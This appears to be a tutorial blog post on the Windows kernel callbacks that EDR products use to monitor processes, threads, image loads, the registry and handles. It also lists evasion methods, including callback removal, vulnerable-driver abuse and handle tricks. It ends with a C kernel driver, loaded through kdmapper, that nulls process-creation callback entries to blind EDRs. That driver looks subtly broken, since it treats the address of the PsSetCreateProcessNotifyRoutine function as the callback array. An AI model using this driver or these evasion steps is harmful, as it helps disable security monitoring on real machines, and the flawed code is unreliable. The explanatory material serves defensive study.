---
title: Kernel Callbacks
published: 2026-05-13
tags: [Markdown, AntiVirus-Evasion, EDR-Evasion, Malware]
category: EDR-Evasion
draft: false
---

# Kernel Callbacks

Windows exposes several kernel notification mechanisms that EDRs register into from a kernel-mode driver. These callbacks let the EDR observe security-relevant events before or immediately after they occur, without userland API hooking.

The most important one for process monitoring is:

```c
NTSTATUS PsSetCreateProcessNotifyRoutineEx(
  [in] PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine,
  [in] BOOLEAN                           Remove
);
```

```c
NTSTATUS PsSetCreateProcessNotifyRoutine(
  [in] PCREATE_PROCESS_NOTIFY_ROUTINE NotifyRoutine,
  [in] BOOLEAN                        Remove
);
```
The EDR driver registers a callback function with the kernel:

```c
VOID ProcessNotifyCallbackEx(
    PEPROCESS Process,
    HANDLE ProcessId,
    PPS_CREATE_NOTIFY_INFO CreateInfo
)
{
    if (CreateInfo)
    {
        // Process creation
    }
    else
    {
        // Process termination
    }
}
```

When any process starts or exits, the Windows kernel invokes every registered callback.

# What the EDR receives?

For process creation (CreateInfo != NULL), the EDR can access:

- Image path
- Command line
- Parent PID
- Creating thread/process
- Token information
- Signing level
- File object
- Section object

Example:

```c
CreateInfo->ImageFileName
CreateInfo->CommandLine
CreateInfo->ParentProcessId
```

This allows detection logic such as:

- powershell.exe -enc ...
- Office spawning cmd.exe
- Browser spawning unsigned binaries
- LOLBIN abuse
- PPID spoofing detection



Internal flow

Very simplified flow:
```C
CreateProcess()
  ->
NtCreateUserProcess()
  ->
PspAllocateProcess()
  ->
PspInsertProcess()
  ->
PspCallProcessNotifyRoutines()
       ^
       |
   EDR callback invoked here

The callback runs in kernel context.

```

# Other kernel callbacks used by EDRs
## Thread callbacks
```c
NTSTATUS PsSetCreateThreadNotifyRoutine(
  [in] PCREATE_THREAD_NOTIFY_ROUTINE NotifyRoutine
);
```

Monitor:

- Remote thread injection
- APC/thread hijacking
- Suspicious thread starts


## Image load callbacks

```c
NTSTATUS PsSetLoadImageNotifyRoutine(
  [in] PLOAD_IMAGE_NOTIFY_ROUTINE NotifyRoutine
);
```

Triggered when:

- EXE loaded
- DLL loaded
- Driver loaded

Useful for:

- DLL injection
- Reflective loading detection
- Unsigned module detection


## Registry callbacks
```c
NTSTATUS CmRegisterCallbackEx(
  [in]           PEX_CALLBACK_FUNCTION Function,
  [in]           PCUNICODE_STRING      Altitude,
  [in]           PVOID                 Driver,
  [in, optional] PVOID                 Context,
  [out]          PLARGE_INTEGER        Cookie,
                 PVOID                 Reserved
);
```

Monitor:

- Run keys
- IFEO persistence
- Service registration
- Defender tampering

## Object callbacks

```c
NTSTATUS ObRegisterCallbacks(
  [in]  POB_CALLBACK_REGISTRATION CallbackRegistration,
  [out] PVOID                     *RegistrationHandle
);
```

Monitor/modify handle operations on:

- Processes
- Threads
- Desktops

This is how EDRs detect:

- OpenProcess(PROCESS_VM_WRITE)
- PROCESS_CREATE_THREAD
- LSASS access
- Handle duplication

Ex:
```
Attacker:
    OpenProcess(lsass.exe)

Kernel:
    Ob callback fires

EDR:
    Inspect requested access mask
```

The EDR may:

- Log
- Strip permissions
- Block access

# Why callbacks are powerful

Unlike usermode API hooks:

- Harder to bypass
- Triggered by direct syscalls too
- See activity before usermode
- Global visibility across all processes

Even if malware does: ```syscall```

instead of calling ```kernel32!CreateProcessW```

-> The kernel callback still fires.

# Typical EDR architecture
```c
[Usermode Agent]
    |
    | IOCTL / ETW / shared memory
    v
[Kernel Driver]
    |
    +-- Process callbacks
    +-- Thread callbacks
    +-- Image callbacks
    +-- Object callbacks
    +-- Minifilter callbacks
```



# Common malware bypass attempts
## Callback removal
Attackers historically:

- unloaded EDR driver
- patched callback arrays
- used DKOM

Modern Windows protections:

- PatchGuard
- HVCI
- kernel signing
- make this much harder.
## Bring Your Own Vulnerable Driver (BYOVD)

Malware loads a vulnerable signed driver to:
- disable callbacks
- kill protected processes
- patch kernel structures

Examples:
- RTCore64
- GDRV
- DBUtil
## Handle-less attacks

To evade ```ObRegisterCallbacks```:

- duplicate existing handles
- inherit handles
- indirect syscalls
- kernel-assisted access


## Enumerating callbacks

Researchers often inspect:

- PspCreateProcessNotifyRoutine
- PspLoadImageNotifyRoutine
- PspCreateThreadNotifyRoutine

Using:

- WinDbg
- kernel drivers
- volatility
- Rekall

Example WinDbg:
```
x nt!PspCreateProcessNotifyRoutine*
```
Or kernel memory analysis.




Ex:

```c title="PspCreateProcessNotifyRoutineBypass.c"
#include <ntddk.h>
// Source code: https://courses.redteamleaders.com/courses/3e9e0212-81dc-49ed-9233-ec9ca894fc6a/take/82---edrs-kernel-callbacks

typedef struct _CALLBACK_ENTRY {
    LIST_ENTRY CallbackList;
    PVOID Function;
    PVOID Context;
} CALLBACK_ENTRY, * PCALLBACK_ENTRY;

extern "C" PVOID PsSetCreateProcessNotifyRoutine;

void DisableProcessCallbacks()
{
    DbgPrint("[*] Attempting to disable process creation callbacks...\n");

    // Get pointer to array
    // PsSetCreateProcessNotifyRoutine isn't exported directly.
    // x nt!PspCreateProcessNotifyRoutine
    PVOID* PspCreateProcessNotifyRoutine = (PVOID*)PsSetCreateProcessNotifyRoutine;

    for (int i = 0; i < 64; i++) // up to 64 entries max
    {
        PVOID entry = InterlockedExchangePointer(&PspCreateProcessNotifyRoutine[i], NULL);
        if (entry != NULL)
        {
            DbgPrint("[+] Callback %d removed: %p\n", i, entry);
        }
    }
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    DriverObject->DriverUnload = [](PDRIVER_OBJECT) {};

    DisableProcessCallbacks();

    return STATUS_SUCCESS;
}



// kdmapper.exe PspCreateProcessNotifyRoutineBypass.sys
// x nt!PspCreateProcessNotifyRoutine
```


Ref: 
- https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/subscribing-to-process-creation-thread-creation-and-image-load-notifications-from-a-kernel-driver

- https://courses.redteamleaders.com/courses/3e9e0212-81dc-49ed-9233-ec9ca894fc6a/take/82---edrs-kernel-callbacks

